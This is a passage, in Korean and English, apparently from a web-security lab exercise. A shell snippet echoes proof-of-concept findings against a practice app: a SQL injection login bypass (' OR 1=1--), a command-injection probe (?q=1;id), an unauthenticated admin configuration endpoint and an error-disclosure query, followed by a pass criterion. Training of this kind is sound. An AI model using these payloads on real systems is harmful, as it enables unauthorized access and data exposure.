      echo "증거/PoC (재현 명령 + 응답 증거 + 영향):"
      echo "SQLi: POST /rest/user/login {email:\"' OR 1=1--\"} → authentication 우회/JWT 발급"
      echo "RCE: GET /?q=1;id → ModSec 932 탐지(차단형) / 미차단 시 명령 실행"
      echo "A01: GET /rest/admin/application-configuration → 200(무인증 설정 노출)"
      echo "정보노출: GET /rest/products/search?q=test' → SQLITE_ERROR(엔진 노출)"
      # 2) 원칙 — '있다'가 아니라 '이렇게 재현된다'
      echo "→ 각 발견 = 재현 명령 + 응답 증거 + 영향(있다가 아니라 이렇게 재현된다)"
      ```

      ## ✅ 합격 기준
      `PoC` 출력 시 통과. **근거:** 각 발견이 재현 명령→응답 증거 형태(SQLi: `' OR 1=1--`→관리자 JWT /
